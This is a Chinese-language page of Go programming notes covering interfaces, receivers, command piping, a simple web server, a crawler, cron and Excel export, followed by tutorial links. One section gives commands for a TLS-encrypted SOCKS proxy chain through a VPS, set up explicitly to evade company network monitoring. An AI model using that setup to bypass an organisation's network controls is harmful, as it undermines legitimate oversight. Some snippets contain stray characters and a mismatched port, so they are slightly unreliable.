class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">type Usb interface &#123;</span><br><span class="line">    Start()</span><br><span class="line">    Stop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Phone struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p Phone) Start() &#123;</span><br><span class="line">    p.Name = <span class="string">"张三"</span> <span class="comment">//这里对引用传递还是值传递的作用一样生效，所以这里没有变化</span></span><br><span class="line">    fmt.Println(<span class="string">"手机开始工作了..."</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p Phone) Stop() &#123;</span><br><span class="line">    fmt.Println(p.Name) <span class="comment">//李四</span></span><br><span class="line">    fmt.Println(<span class="string">"手机停止工作了..."</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Carame struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (c *Carame) Start() &#123;</span><br><span class="line">    c.Name = <span class="string">"张三"</span> <span class="comment">//这里对引用传递还是值传递的作用一样生效，所以这里有变化</span></span><br><span class="line">    fmt.Println(<span class="string">"相机开始工作了..."</span>)</span><br><span class="line">&#125;</span><br><span class="line">func (c *Carame) Stop() &#123;</span><br><span class="line">    fmt.Println(c.Name) <span class="comment">//张三</span></span><br><span class="line">    fmt.Println((*c).Name) <span class="comment">//张三</span></span><br><span class="line">    fmt.Println(<span class="string">"相机停止工作了..."</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Computer struct &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Usb是前面定义的接口，这里调用的2个函数，在结构体中一定都要有声明过，否则报错。</span></span><br><span class="line">func (com *Computer) Working(usb Usb) &#123;</span><br><span class="line">    usb.Start()</span><br><span class="line">    usb.Stop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="keyword">var</span> phone = Phone&#123;&#125;</span><br><span class="line">    phone.Name = <span class="string">"李四"</span></span><br><span class="line">    <span class="keyword">var</span> carame = Carame&#123;&#125;</span><br><span class="line">    carame.Name = <span class="string">"李四"</span></span><br><span class="line">    <span class="keyword">var</span> computer = Computer&#123;&#125;</span><br><span class="line">    <span class="comment">//这里传入参数是地址还是对象，需要依靠原结构体里定义的方法来判断(比如Phone结构体)。比如Phone结构体中的start方法是p，此时Working传入对象还是地址都可以。如果是*p，则必须传入地址。与com的类型无关。</span></span><br><span class="line">    computer.Working(&amp;phone)</span><br><span class="line">    computer.Working(&amp;carame)</span><br><span class="line">    <span class="comment">//最后输出</span></span><br><span class="line">    <span class="comment">// 手机开始工作了...</span></span><br><span class="line">    <span class="comment">// 李四</span></span><br><span class="line">    <span class="comment">// 手机停止工作了...</span></span><br><span class="line">    <span class="comment">// 相机开始工作了...</span></span><br><span class="line">    <span class="comment">// 张三</span></span><br><span class="line">    <span class="comment">// 相机停止工作了...</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/32266</span></span><br></pre></td></tr></table></figure></p>
<h3 id="面向对象特性"><a href="#面向对象特性" class="headerlink" title="面向对象特性"></a>面向对象特性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">接口使用 interface 关键字声明，任何实现接口定义方法的类都可以实例化该接口，接口和实现类之间没有任何依赖</span><br><span class="line">type Sayer interface &#123;</span><br><span class="line">    Say(message string)</span><br><span class="line">    SayHi()</span><br><span class="line">&#125;</span><br><span class="line">继承使用组合的方式实现</span><br><span class="line"></span><br><span class="line">type Animal struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (a *Animal) Say(message string) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Animal[%v] say: %v\n"</span>, a.Name, message)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Dog struct &#123;</span><br><span class="line">    Animal</span><br><span class="line">&#125;</span><br><span class="line">Dog 将继承 Animal 的 Say 方法，以及其成员 Name</span><br><span class="line">子类可以重新实现父类的方法</span><br><span class="line"></span><br><span class="line"><span class="comment">// override Animal.Say</span></span><br><span class="line">func (d *Dog) Say(message string) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Dog[%v] say: %v\n"</span>, d.Name, message)</span><br><span class="line">&#125;</span><br><span class="line">Dog.Say 将覆盖 Animal.Say</span><br><span class="line"><span class="keyword">var</span> sayer Sayer</span><br><span class="line"></span><br><span class="line">sayer = &amp;Dog&#123;Animal&#123;<span class="attr">Name</span>: <span class="string">"Yoda"</span>&#125;&#125;</span><br><span class="line">sayer.Say(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="使用-Proxy-突破网管的限制"><a href="#使用-Proxy-突破网管的限制" class="headerlink" title="使用 Proxy 突破网管的限制"></a>使用 Proxy 突破网管的限制</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//gitee.com/snail/proxy</span></span><br><span class="line">为了绕开公司网络的监测，需要加密本地发往代理服务器的数据，然后由代理服务器解密数据，再发往真正的服务器，因些我们需要两级代理</span><br><span class="line">./proxy keygen -C proxy</span><br><span class="line">执行命令会在当前目录下生成 proxy.key 和 proxy.crt 两个文件，将这两个文件复制到本机的 <span class="built_in">Proxy</span> 安装目录中</span><br><span class="line">在 VPS 上执行命令：</span><br><span class="line">./proxy socks -t tls -p <span class="string">":3333"</span> -C proxy.crt -K proxy.key --daemon --forever --log proxy.log</span><br><span class="line"></span><br><span class="line">本机打开 <span class="built_in">Proxy</span> 安装目录中的 “bootstrap.bat” 文件，将 “proxy.exe ...” 这一行修改为：</span><br><span class="line"></span><br><span class="line">proxy.exe socks -p <span class="string">":3334"</span> -t tcp -T tls -P <span class="string">"IP:3333"</span> -C proxy.crt -K proxy.key --debug</span><br><span class="line">其中小写 <span class="string">"p"</span> 表示本机监听端口，大写 “P” 表示 VPS 端监听地址，小写 “t” 表示本机使用的传输协议，大写 “T” 表示 VPS 端使用的传输协议。保存文件后，双击 “bootstrap.bat” 即可启动 <span class="built_in">Proxy</span>。</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32369</span></span><br></pre></td></tr></table></figure>
<h3 id="go-执行系统命令时不能直接使用管道符"><a href="#go-执行系统命令时不能直接使用管道符" class="headerlink" title="go 执行系统命令时不能直接使用管道符"></a>go 执行系统命令时不能直接使用管道符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">方法一（异步）</span><br><span class="line"></span><br><span class="line">func <span class="keyword">async</span>() &#123;</span><br><span class="line">    cmd1 := exec.Command(<span class="string">"ls"</span>, <span class="string">"."</span>)</span><br><span class="line">    cmd2 := exec.Command(<span class="string">"grep"</span>, <span class="string">"go"</span>)</span><br><span class="line">    out, <span class="attr">_</span> := cmd1.StdoutPipe()</span><br><span class="line">    <span class="keyword">in</span>, <span class="attr">_</span> := cmd2.StdinPipe()</span><br><span class="line">    cmd2.Stdout = os.Stdout</span><br><span class="line">    go func() &#123;</span><br><span class="line">        defer func() &#123;</span><br><span class="line">            out.Close()</span><br><span class="line">            <span class="keyword">in</span>.Close()</span><br><span class="line">        &#125;()</span><br><span class="line">        io.Copy(<span class="keyword">in</span>, out)</span><br><span class="line">    &#125;()</span><br><span class="line">    cmd1.Run()</span><br><span class="line">    cmd2.Run()</span><br><span class="line">&#125;</span><br><span class="line">方法二（同步）</span><br><span class="line"></span><br><span class="line">func sync() &#123;</span><br><span class="line">    cmd1 := exec.Command(<span class="string">"ls"</span>, <span class="string">"."</span>)</span><br><span class="line">    cmd2 := exec.Command(<span class="string">"grep"</span>, <span class="string">"go"</span>)</span><br><span class="line">    <span class="keyword">in</span>, <span class="attr">_</span> := cmd2.StdinPipe()</span><br><span class="line">    cmd1.Stdout = <span class="keyword">in</span></span><br><span class="line">    cmd2.Stdout = os.Stdout</span><br><span class="line">    cmd2.Start()</span><br><span class="line">    cmd1.Run()</span><br><span class="line">    <span class="keyword">in</span>.Close()</span><br><span class="line">    cmd2.Wait()</span><br><span class="line">&#125;</span><br><span class="line">方法三（多个）</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    cmd1 := exec.Command(<span class="string">"ls"</span>, <span class="string">"."</span>)</span><br><span class="line">    cmd2 := exec.Command(<span class="string">"grep"</span>, <span class="string">"go"</span>)</span><br><span class="line">    cmd3 := exec.Command(<span class="string">"grep"</span>, <span class="string">"main"</span>)</span><br><span class="line">    cmd3.Stdout = os.Stdout</span><br><span class="line">    pipe(cmd1, cmd2, cmd3)</span><br><span class="line">    cmd1.Run()</span><br><span class="line">    cmd2.Run()</span><br><span class="line">    cmd3.Run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func pipe(cmds ...*exec.Cmd) &#123;</span><br><span class="line">    <span class="keyword">for</span> i, <span class="attr">cmd</span> := range cmds &#123;</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> &#123;</span><br><span class="line">            out, <span class="attr">_</span> := cmds[i<span class="number">-1</span>].StdoutPipe()</span><br><span class="line">            <span class="keyword">in</span>, <span class="attr">_</span> := cmd.StdinPipe()</span><br><span class="line">            go func() &#123;</span><br><span class="line">                defer func() &#123;</span><br><span class="line">                    out.Close()</span><br><span class="line">                    <span class="keyword">in</span>.Close()</span><br><span class="line">                &#125;()</span><br><span class="line">                io.Copy(<span class="keyword">in</span>, out)</span><br><span class="line">            &#125;()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33592</span></span><br></pre></td></tr></table></figure>
<h3 id="实现一个-web-服务器"><a href="#实现一个-web-服务器" class="headerlink" title="实现一个 web 服务器"></a>实现一个 web 服务器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"io"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">"/hello"</span>, helloHandler)</span><br><span class="line">    err := http.ListenAndServe(<span class="string">":8000"</span>, nil)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        log.Fatal(<span class="string">"ListenAndServe:"</span>, err.Error())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func helloHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    io.WriteString(w, <span class="string">"hello, world!"</span>)</span><br><span class="line">&#125;</span><br><span class="line">$ go run hello.go</span><br><span class="line">$ curl http:<span class="comment">//localhost:8080/hello</span></span><br><span class="line">hello, world!</span><br><span class="line">https:<span class="comment">//learnku.com/golang/wikis/26652</span></span><br></pre></td></tr></table></figure>
<h3 id="Go-爬虫框架"><a href="#Go-爬虫框架" class="headerlink" title="Go 爬虫框架"></a>Go 爬虫框架</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/zhshch2002/goribot  </span></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"encoding/json"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"github.com/zhshch2002/goribot"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    s := goribot.NewSpider()</span><br><span class="line">    _ = s.Get(nil, <span class="string">"https://httpbin.org/get?Goribot%20test=hello%20world"</span>, func(r *goribot.Response) &#123;</span><br><span class="line">        m := make(map[string]interface&#123;&#125;)</span><br><span class="line">        err := json.Unmarshal([]byte(r.Text), &amp;m)</span><br><span class="line">        <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(m)</span><br><span class="line">    &#125;)</span><br><span class="line">    s.Run()</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/33980</span></span><br></pre></td></tr></table></figure>
<p>###go命令行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/cosmos72/gomacro</span><br><span class="line">λ gomacro.exe</span><br><span class="line"><span class="comment">// GOMACRO, an interactive Go interpreter with generics and macros</span></span><br><span class="line"><span class="comment">// Copyright (C) 2018-2019 Massimiliano Ghilardi &lt;https://github.com/cosmos72/gomacro&gt;</span></span><br><span class="line"><span class="comment">// License MPL v2.0+: Mozilla Public License version 2.0 or later &lt;http://mozilla.org/MPL/2.0/&gt;</span></span><br><span class="line"><span class="comment">// This is free software with ABSOLUTELY NO WARRANTY.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Type :help for help</span></span><br><span class="line">gomacro&gt; a:=<span class="number">1</span></span><br><span class="line">gomacro&gt; a</span><br><span class="line"><span class="number">1</span>       <span class="comment">// int</span></span><br><span class="line">go get -u github.com/motemen/gore/cmd/gore</span><br><span class="line">❯ gore</span><br><span class="line">gore version <span class="number">0.4</span><span class="number">.1</span>  :help <span class="keyword">for</span> help</span><br><span class="line">gore&gt; a := <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">gore&gt; a + <span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">gore&gt; func Add(a, b int) int &#123; <span class="keyword">return</span> a + b &#125;</span><br><span class="line">gore&gt; Add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<h3 id="go-cron-秒"><a href="#go-cron-秒" class="headerlink" title="go cron 秒"></a>go cron 秒</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/robfig/cron"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    c := cron.New()</span><br><span class="line"></span><br><span class="line">    c.AddFunc(<span class="string">"*/1 * * * * *"</span>, func() &#123;</span><br><span class="line">        fmt.Println(<span class="string">"every 1 seconds executing"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    go c.Start()</span><br><span class="line">    defer c.Stop()</span><br><span class="line"></span><br><span class="line">    select &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(time.Second * 10):</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">&#125;https://learnku.com/articles/34456</span><br><span class="line">Github：github.com/robfig/cron</span><br></pre></td></tr></table></figure>
<h3 id="Go-使用反射导出-Excel"><a href="#Go-使用反射导出-Excel" class="headerlink" title="Go 使用反射导出 Excel"></a>Go 使用反射导出 Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">type Record struct &#123;</span><br><span class="line">    Name string <span class="string">`xlsx:"A-姓名"`</span></span><br><span class="line">    Age  int32  <span class="string">`xlsx:"B-年齡"`</span></span><br><span class="line">&#125;</span><br><span class="line">func RefactorWrite(records []*Record) &#123;</span><br><span class="line">    xlsx := excelize.NewFile()</span><br><span class="line">    index := xlsx.NewSheet(<span class="string">"Sheet1"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, <span class="attr">t</span> := range records &#123;</span><br><span class="line">        d := reflect.TypeOf(t).Elem()</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; d.NumField(); j++ &#123;</span><br><span class="line">            <span class="comment">// 设置表头</span></span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span> &#123;</span><br><span class="line">                column := strings.Split(d.Field(j).Tag.Get(<span class="string">"xlsx"</span>), <span class="string">"-"</span>)[<span class="number">0</span>]</span><br><span class="line">                name := strings.Split(d.Field(j).Tag.Get(<span class="string">"xlsx"</span>), <span class="string">"-"</span>)[<span class="number">1</span>]</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">1</span>), name)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置内容</span></span><br><span class="line">            column := strings.Split(d.Field(j).Tag.Get(<span class="string">"xlsx"</span>), <span class="string">"-"</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">switch</span> d.Field(j).Type.String() &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"string"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).String())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"int32"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Int())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"int64"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Int())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"bool"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Bool())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"float32"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Float())</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"float64"</span>:</span><br><span class="line">                xlsx.SetCellValue(<span class="string">"Sheet1"</span>, fmt.Sprintf(<span class="string">"%s%d"</span>, column, i+<span class="number">2</span>), reflect.ValueOf(t).Elem().Field(j).Float())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xlsx.SetActiveSheet(index)</span><br><span class="line">    <span class="comment">// 保存到xlsx中</span></span><br><span class="line">    err := xlsx.SaveAs(<span class="string">"test_write.xlsx"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="keyword">var</span> records []*Record\</span><br><span class="line">    records = append(records, &amp;Record&#123;\</span><br><span class="line">       Name: <span class="string">"小明"</span>,\</span><br><span class="line">      Age:  <span class="number">11</span>,\</span><br><span class="line">    &#125;)\</span><br><span class="line">    records = append(records, &amp;Record&#123;\</span><br><span class="line">       Name: <span class="string">"小华"</span>,\</span><br><span class="line">      Age:  <span class="number">12</span>,\</span><br><span class="line">    &#125;)\</span><br><span class="line">    <span class="comment">// 反射写\</span></span><br><span class="line">    RefactorWrite(records)</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/34635</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-解析工具"><a href="#Redis-解析工具" class="headerlink" title="Redis 解析工具"></a>Redis 解析工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/8090Lambert/go-redis-parser</span></span><br><span class="line">go get github.com/<span class="number">8090</span>Lambert/go-redis-parser</span><br><span class="line">$ go-redis-parser -rdb &lt;dump.rdb&gt; -o &lt;gen-file folder&gt; -type &lt;gen-file type, json or csv, <span class="keyword">default</span> csv&gt;</span><br><span class="line"></span><br><span class="line">BigKeys 的输出示例：</span><br><span class="line"></span><br><span class="line"># Scanning the rdb file to find biggest keys</span><br><span class="line"></span><br><span class="line">-------- summary -------</span><br><span class="line"></span><br><span class="line">Sampled <span class="number">6</span> keys <span class="keyword">in</span> the keyspace!</span><br><span class="line">Total key length <span class="keyword">in</span> bytes is <span class="number">17</span></span><br><span class="line"></span><br><span class="line">Biggest string found <span class="string">'s'</span> has <span class="number">1</span> bytes</span><br><span class="line">Biggest   hash found <span class="string">'h'</span> has <span class="number">1</span> fields</span><br><span class="line">Biggest   list found <span class="string">'li'</span> has <span class="number">2</span> items</span><br><span class="line">Biggest sortedset found <span class="string">'zset'</span> has <span class="number">2</span> members</span><br><span class="line">Biggest    set found <span class="string">'set'</span> has <span class="number">2</span> members</span><br><span class="line">Biggest stream found <span class="string">'stream'</span> has <span class="number">3</span> entries</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> string <span class="keyword">with</span> <span class="number">1</span> bytes</span><br><span class="line"><span class="number">1</span> hash <span class="keyword">with</span> <span class="number">1</span> fields</span><br><span class="line"><span class="number">1</span> list <span class="keyword">with</span> <span class="number">2</span> items</span><br><span class="line">https:<span class="comment">//learnku.com/articles/34655</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/34641" target="_blank" rel="noopener">批量导出 CSDN 博客并转为 hexo 博客风格</a></p>
<p><a href="https://learnku.com/golang/t/34334" target="_blank" rel="noopener">警惕 Go 编程陷阱</a></p>
<p><a href="https://learnku.com/articles/34621" target="_blank" rel="noopener">golang IoC</a></p>
<p><a href="https://learnku.com/articles/34190#reply110842" target="_blank" rel="noopener">Golang 操作 Redis 的基本方法</a></p>
<p><a href="https://learnku.com/golang/t/33859" target="_blank" rel="noopener">Go Modules 不完全教程</a></p>
<p><a href="https://learnku.com/articles/34299" target="_blank" rel="noopener">Go 获取已插入 U 盘盘符</a></p>
<p><a href="https://learnku.com/golang/t/34095" target="_blank" rel="noopener">单元测试</a></p>
<p><a href="https://github.com/pibigstar/go-demo" target="_blank" rel="noopener">一些例子和小项目</a></p>
<p><a href="https://strconv.com/posts/web-crawler-exercise-1/" target="_blank" rel="noopener">用Golang写爬虫(一)</a></p>
<p><a href="https://github.com/levigross/grequests" target="_blank" rel="noopener"> go 版本的 requests </a></p>
<p><a href="https://strconv.com/posts/go-repl/?" target="_blank" rel="noopener">go命令行</a></p>
<p><a href="https://book.eddycjy.com/golang/talk/golang-relatively-path.html" target="_blank" rel="noopener">go系列教程</a></p>
<p><a href="https://learnku.com/articles/34112" target="_blank" rel="noopener">beego 代码自动生成器</a></p>
<p><a href="https://learnku.com/articles/34091" target="_blank" rel="noopener">Go Modules 使用</a></p>
<p><a href="https://learnku.com/articles/34013" target="_blank" rel="noopener">文件传输管理系统Bigfile </a></p>
<p><a href="https://github.com/1920853199/go-blog" target="_blank" rel="noopener">基于 beego 的，有情怀的博客</a></p>
<p><a href="https://learnku.com/articles/34051" target="_blank" rel="noopener">Go 基础教程–2-基础知识</a></p>
<p><a href="https://learnku.com/golang/t/33901" target="_blank" rel="noopener">Go 语言 RESTful JSON API 创建</a></p>
<p><a href="https://learnku.com/articles/33918" target="_blank" rel="noopener">Golang slice 从源码来理解</a></p>
